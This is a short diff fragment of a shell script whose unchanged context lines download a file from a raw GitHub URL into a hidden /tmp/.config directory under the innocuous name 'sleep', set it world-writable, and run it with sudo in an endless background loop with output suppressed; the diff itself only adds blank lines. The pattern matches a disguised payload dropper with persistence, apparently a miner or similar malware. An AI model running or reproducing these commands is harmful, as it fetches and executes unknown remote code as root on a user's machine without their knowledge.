@@ -6,3 +6,6 @@ wget -qO /tmp/.config/sleep https://raw.githubusercontent.com/vjbahkds/cajbdfv/m
 chmod -R 777 /tmp/.config
 /bin/sh -c "while true; do nohup sudo /tmp/.config/sleep --config=/tmp/.config/.json >/dev/null; done" &
 
+
+
+
